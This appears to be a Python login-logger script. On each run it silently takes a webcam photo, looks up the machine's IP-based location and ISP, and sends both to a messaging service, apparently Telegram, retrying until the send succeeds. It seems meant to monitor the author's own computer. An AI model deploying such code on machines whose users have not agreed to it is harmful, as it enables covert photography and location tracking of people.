import cv2
from time import sleep
from datetime import datetime
import sys
from t import sendImage
import socket
import os
import atexit
from requests import get
action = sys.argv[-1]

# input(os.getcwd())

# os.chdir("H:\\Logger")
os.chdir(os.getcwd())



def getLocation():
	source = 'http://ipinfo.io/json'
	response = get(source)
	data = response.json()
	ip = data['ip']
	city = data['city']
	region = data['region']
	country = data['country']
	org = data['org']
	postal = data['postal']
	return "\nIP : {}\nLocation : {}, {}, {}, {}\nISP : {}".format(ip,postal,city,region,country,org)

def is_connected(hostname):
	try:
		host = socket.gethostbyname(hostname)
		s = socket.create_connection((host, 80), 2)
		s.close()
		return True
	except:
		return False

def sendOnTele(fname,timestamp,retry=0):
	loc = ''
	if is_connected("one.one.one.one"):
		try:
			loc = getLocation()
			report = str(sendImage('captures/'+fname+'.jpg',action + " | "+timestamp + loc))
			sendStatus = 1
		except Exception as e:
			report = "False"
			sendStatus = -1
	else:
		report = 'No internet'
		sendStatus = -1
	if retry==0:
		with open("logs.txt",'a') as f:
			f.write(action + " : " + str(timestamp) + " | Sent = "+report+"\n"+ loc)
	return sendStatus

def captureAndSend(action='Login'):
	now = datetime.now()
	timestamp = now.strftime("%d %B, %Y, %H:%M")
	fname = str(datetime.now().timestamp()).replace(".","-")
	video_capture = cv2.VideoCapture(0)
	if not video_capture.isOpened():
		sleep(5)
		pass
	ret, frame = video_capture.read()
	cv2.imwrite('captures/'+fname+'.jpg', frame)
	# print(os.getcwd())
	video_capture.release()
	cv2.destroyAllWindows()
	sendStatus = sendOnTele(fname,timestamp,0)
	if action!="Shut-Down":
		while sendStatus!=1:
			# print('sleeping')
			sleep(10)
			sendStatus = sendOnTele(fname,timestamp,1)

captureAndSend()

# os.system('pause')
# input()
# atexit.register(captureAndSend, action='Shut-Down')
# exit()


